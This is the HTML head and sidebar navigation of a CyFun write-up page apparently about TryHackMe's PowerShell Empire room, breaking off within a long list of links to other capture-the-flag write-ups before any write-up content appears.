<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-Tryhackme/PS Empire/PS Empire">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">PS Empire | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/Tryhackme/PS Empire/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="PS Empire | CyFun"><meta data-rh="true" name="description" content="Learn how to use Powershell Empire, a powerful post-exploitation framework."><meta data-rh="true" property="og:description" content="Learn how to use Powershell Empire, a powerful post-exploitation framework."><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/Tryhackme/PS Empire/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/PS Empire/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/PS Empire/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/Tryhackme/0day/">Tryhackme</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/0day/">0day</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Active Directory Basics/">Active Directory Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber/">Advent of Cyber</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber 2/">Advent of Cyber 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Adventure Time/">Adventure Time</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Agent Sudo/">Agent Sudo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Alfred/">Alfred</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonforce/">Anonforce</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous/">Anonymous</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous Playground/">Anonymous Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anthem/">Anthem</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Aster/">Aster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/AttackerKB/">AttackerKB</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Attacking ICS Plant 1/Attacking ICS Plant/">Attacking ICS Plant 1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacking Kerberos/">Attacking Kerberos</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacktive Directory/">Attacktive Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Authenticate/">Authenticate</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Avengers Blog/">Avengers Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Basic Malware RE/">Basic Malware RE</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/BasicPentesting/Basic Pentesting/">BasicPentesting</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Binex/">Binex</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Biohazard/">Biohazard</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blog/">Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blue/">Blue</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blueprint/">Blueprint</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Boiler CTF/">Boiler CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bolt/">Bolt</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Borderlands/">Borderlands</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bounty Hacker/">Bounty Hacker</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brainstorm/">Brainstorm</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break Out The Cage/">Break Out The Cage</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break it/">Break it</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Brooklyn Nine Nine/Brookyln nine nine/">Brooklyn Nine Nine</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brute It/">Brute It</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Buffer Overflow Prep/">Buffer Overflow Prep</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Burp Suite/Burpsuite/">Burp Suite</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/C4ptur3-th3-fl4g/c4ptur3 th3 fl4g/">C4ptur3-th3-fl4g</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CC Steganography/">CC: Steganography</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CMesS/">CMesS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CTF collection Vol.1/">CTF collection Vol.1</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Carpe Diem 1/Carpe Deim 1/">Carpe Diem 1</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/CherryBlossom/Cherry Blossom/">CherryBlossom</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Cicada-3301 Vol.1/Cicada 3301 Vol.1/">Cicada-3301 Vol.1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Common Linux Privesc/">Common Linux Privesc</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ConvertMyVideo/">ConvertMyVideo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Crack the hash/">Crack the hash</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Cross-site Scripting/">Cross-site Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daily Bugle/">Daily Bugle</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dav/">Dav</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daves Blog/">Dave&#x27;s Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Develpy/">Develpy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dogcat/">dogcat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Easy Peasy/">Easy Peasy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Empire/">Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Encryption - Crypto 101/">Encryption - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Erit Securus I/">Erit Securus I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/For Business Reasons/">For Business Reasons</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Forensics/">Forensics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Game Zone/">Game Zone</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GamingServer/">GamingServer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Gatekeeper/">Gatekeeper</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Geolocating Images/Geolocating/">Geolocating Images</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Getting Started/">Getting Started</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ghizer/">Ghizer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Git Happens/">Git Happens</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Google Dorking/">Google Dorking</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Gotta Catchem All/Gotta Catch em All/">Gotta Catchem All</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GraphQL/">GraphQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HA Joker CTF/">HA Joker CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HackerNote/">hackerNote</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hacking with Powershell/">Hacking with Powershell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Harder/">harder</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hashing - Crypto 101/">Hashing - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HaskHell/">HaskHell</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Hc0n Christmas CTF/hcon christmas ctf/">Hc0n Christmas CTF</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HeartBleed/">HeartBleed</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/History of Malware/">History of Malware</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hydra/">Hydra Introduction</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ice/">ICE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ignite/">Ignite</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inclusion/">Inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inoculation/">Inoculation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Internal/">Internal</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Intro to Python/">Intro to Python</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Intro to x86-64/Intro to x86 and 64/">Intro to x86-64</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introduction to Django/">Introduction to Django</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introductory Networking/">Introductory Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Investigating Windows/">Investigating Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Iron Corp/">Iron Corp</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack/">Jack</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack-of-All-Trades/">Jack-of-All-Trades</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jacob the Boss/">Jacob the Boss</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/JavaScript Basics/">JavaScript Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jeff/">Jeff</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jupyter 101/">Jupyter 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jurassic Park/">Jurassic Park</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kali Machine/">Kali Machine</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kenobi/">Kenobi</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kiba/">kiba</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/LFI/UFI/">LFI</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LFI Basics/">LFI Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LazyAdmin/">LazyAdmin</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Lian_Yu/Lian Yu/">Lian_Yu</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Library/">Library</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Challenges/">Linux Challenges</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Local 